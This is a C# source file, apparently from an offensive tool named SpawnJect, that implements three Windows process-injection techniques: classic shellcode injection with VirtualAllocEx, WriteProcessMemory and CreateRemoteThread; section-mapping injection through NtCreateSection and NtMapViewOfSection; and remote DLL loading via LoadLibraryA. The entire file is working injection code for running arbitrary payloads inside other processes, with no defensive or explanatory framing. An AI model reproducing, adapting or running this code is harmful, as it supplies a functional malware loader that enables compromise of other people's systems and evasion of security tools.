using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace SpawnJect.Injection
{

    class InjectionOps
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(
        ref IntPtr SectionHandle,
        UInt32 DesiredAccess,
        IntPtr ObjectAttributes,
        ref uint MaximumSize,
        UInt32 SectionPageProtection,
        UInt32 AllocationAttributes,
        IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        UIntPtr ZeroBits,
        uint CommitSize,
        ref ulong SectionOffset,
        ref UIntPtr ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);


        public static void DefaultInject(int pid, byte[] buf)
        {
            Console.WriteLine("opening...");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            //get size of submitted shellcode/payload to feed into VirtualAllocEx dwSize
            Console.WriteLine("alloc-ing...");
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

            Console.WriteLine("memory writing...");
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            Console.WriteLine("remote threading...");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }


        public static void AlternateInject(int pid, byte[] buf)
        {

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            //if issue, check 0x40 - SectionPageProtection
            IntPtr sectionHandle = IntPtr.Zero;

            //uint maxSize = 4096;
            uint maxSize = (uint)buf.Length;
            uint ntStatusSection = NtCreateSection(
                ref sectionHandle,
                0xe,  //desired access
                IntPtr.Zero,  //object attributes
                ref maxSize,
                0x40,  //section page protection
                0x8000000,  //allocation attributes - sec_commit
                IntPtr.Zero  //file handle
                );

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr currentProcess = GetCurrentProcess();
            UIntPtr viewSize = UIntPtr.Zero;

            ulong sectionOffset = 0;
            uint ntStatusMap = NtMapViewOfSection(
                sectionHandle,
                GetCurrentProcess(),
                ref baseAddress,
                UIntPtr.Zero,  //zero bits
                0,  //commit size
                ref sectionOffset,
                ref viewSize,  //view size
                2,  //inherit disposition
                0,  //allocation type
                0x04  //Win32Protect
                );

            IntPtr remoteAddress = IntPtr.Zero;
            uint ntStatusMap2 = NtMapViewOfSection(
                sectionHandle,
                hProcess,
                ref remoteAddress,
                UIntPtr.Zero,
                0,
                ref sectionOffset,
                ref viewSize,
                2,
                0,
                0x20
                );

            Marshal.Copy(buf, 0, baseAddress, buf.Length);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddress, IntPtr.Zero, 0, IntPtr.Zero);

        }

        public static void DLLLoad(int pid, string dir)
        {
            byte[] dllBytes = Encoding.Default.GetBytes(dir);

            Console.WriteLine("opening...");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            //using the DefaultInject APIs to allocate and write memory
            //maybe come back to this and add options to allow DLLLoad 
            //to use the AlternateInject APIs to allocate/write memory

            Console.WriteLine("alloc-ing...");
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length, 0x3000, 0x40);

            Console.WriteLine("memory writing...");

            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, dllBytes, dllBytes.Length, out outSize);

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            Console.WriteLine("remote threading...");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
